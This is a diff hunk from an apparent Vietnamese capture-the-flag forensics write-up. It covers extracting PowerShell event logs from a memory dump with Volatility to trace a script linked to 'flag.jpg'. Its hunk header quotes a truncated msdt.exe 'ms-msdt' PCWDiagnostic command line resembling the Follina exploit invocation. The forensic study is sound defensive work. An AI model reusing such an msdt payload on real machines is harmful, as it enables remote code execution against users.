@@ -135,6 +135,8 @@ C:\Windows\system32\msdt.exe" ms-msdt:/id PCWDiagnostic /skip force /param "IT_R
 - Ý tưởng của mình là lấy đoạn code của file QOaAdcT6dq.ps1 được lưu lại logs file của windows event logs, vì thế ta sẽ sử dụng plugin filescan để quét các tệp có đuôi evtx
 - Mình sẽ trích xuất file `Windows PowerShell.evtx` ra
 > python3 vol.py -f /home/kali/Downloads/mem/mem.dmp windows.filescan | grep evtx
+
+
 > python3 vol.py -f /home/kali/Downloads/mem/mem.dmp windows.dumpfiles --virtaddr 0xe50762216c60
 
 - Mở file này ra với công cụ Event Viewer thì thấy 1 đoạn code có liên quan đến file flag.jpg 
